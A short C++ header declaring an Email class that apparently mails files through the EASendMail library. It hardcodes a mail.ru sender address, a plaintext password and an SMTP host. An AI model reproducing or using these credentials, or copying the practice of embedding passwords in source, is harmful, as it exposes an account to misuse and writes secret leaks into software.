#pragma once
#include <tchar.h>
#include <string>
#include "easendmailobj.tlh"
#define EMAIL_FROM_NAME L"m11a11k1@mail.ru"
#define EMAIL_FROM_PASSWORD L"htgkbrfwbz1"
#define EMAIL_SMTP_ADDRESS L"smtp.mail.com"

using namespace EASendMailObjLib;
using namespace std;
class Email
{
private:
	WCHAR receiver[256];
public:
	Email(string receiver);
	void send(wstring fileName);
	~Email();
};

